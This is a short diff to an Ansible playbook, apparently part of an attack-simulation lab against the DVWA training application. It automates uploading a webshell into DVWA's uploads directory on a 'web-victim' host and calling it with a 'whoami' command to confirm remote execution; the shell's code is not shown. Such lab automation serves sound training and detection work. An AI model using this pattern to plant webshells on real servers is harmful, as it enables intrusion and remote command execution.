@@ -1,15 +1,17 @@
 ---
 - name: Initial Access - Upload mini webshell
-  copy:
-    src: /path/to/local/webshell.php
+  template:
+    src: webshell.php.j2
     dest: /var/www/html/DVWA/hackable/uploads/shell.php
     mode: '0755'
+  delegate_to: "{{ groups['web-victim'][0] }}"
 
 - name: Initial Access - Test access to uploaded webshell
   uri:
-    url: "http://192.168.254.129/DVWA/hackable/uploads/shell.php?cmd=whoami"
+    url: "http://{{ web_victim_ip }}/DVWA/hackable/uploads/shell.php?cmd=whoami"
     return_content: yes
   register: shell_output
+  failed_when: false
 
 - name: Show webshell execution result
   debug:
